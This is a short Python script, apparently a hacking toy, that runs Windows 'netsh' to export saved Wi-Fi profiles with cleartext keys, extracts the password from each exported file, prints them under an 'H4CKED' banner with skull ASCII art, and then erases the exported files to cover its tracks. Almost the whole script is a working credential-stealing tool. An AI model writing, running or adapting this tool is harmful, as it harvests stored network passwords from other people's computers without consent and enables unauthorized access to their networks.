import os
import subprocess
import time
succeed = False
os.system("systeminfo > system.txt")
deter = open("system.txt", "r")
if deter.read().__len__() > 20:
      print("windows")
      succeed = True
      pass
else:
     print("mac/linux")
     os.system("rm system.txt")
     exit()
os.system("color a")
deter.close()
os.system("erase system.txt")
files = os.listdir(os.getcwd())
files11 = files.__len__()
os.system("netsh wla  export profile key=clear ")
files2 = os.listdir(os.getcwd())
files22 = files2.__len__()
os.system("cls")
if files11 == files22:
       print("no wifi passwords")
else:
      if files11 < files22:
            print("dumped passwords found..")
            print("dumped: " + str(files22 - files11))
            for i in range(files2.__len__()):
                     if files2[i] in files:
                              pass
                     else:
                          filla = files2[i].split(".")
                          os.system("rename " + files2[i] + " " + filla[0] + ".txt")
                          files2[i] = filla[0] + ".txt"
                          passworddump = open(files2[i], "r")
                          dump = passworddump.read()
                          passworddump.close()
                          passwordprocess = dump.split("keyMaterial")
                          aga = passwordprocess[1]
                          aga2 = len(aga) - 2
                          aga = aga[1:aga2]
                          print("----------------------H4CKED--------------------")
                          print(files2[i] + "   password: " + aga + "\n")
                          os.system("erase " + files2[i] + " >nul")

            print("""\
               B.                                                                            
                Q.7L                                                                          
                . BQ                                                                          
                   .. v                                                                       
             :BB   BiIBBqdL                                                                   
    .      .ZBQB5  :rBdZBPB:      :.                                                          
   .B.     7BEdRBB..BbbqZqs      7Bi                                                          
   UB      iQgMBRRBQEgQQgQB.     :1                                                           
           iBBXsjQMERDJLbBB   .BB                                                             
     B    iBv     DB5    UB.   i.                                                             
     B     MB     BBg    rB.                                                                  
     r     :QQ.  Q. rE  :BB.   :YX .                                                          
    Q Q7    vBBBBg   BBBBB.    JY7BE                                                          
   RQ.BBP      IBBQBBBBr     rQBX2Bj                                                          
    jvsPQ  L   .LQIRXM7   .rBBBuUSr                                                           
        7B.BBB7r       rIBBBK.                                                                
        .Bi .JRBQP   vBBMr.                                                                   
                jgBgs.:      i                                                                
       r.     iYs :BBBdL.   UB                                                                
       dBi uDBBBB7   uBBBB5v i                                                                
      1D: iBB57        .vdBQ7 ivXQI                                                           
      5BQQDj.             iJBBEq r5                                                           
       MBBQ:                 7BBBS                                                             
       :Eu                     qK
                                                              """)
                                                                                                                                                      
            time.sleep(100)

      else:
            exit()
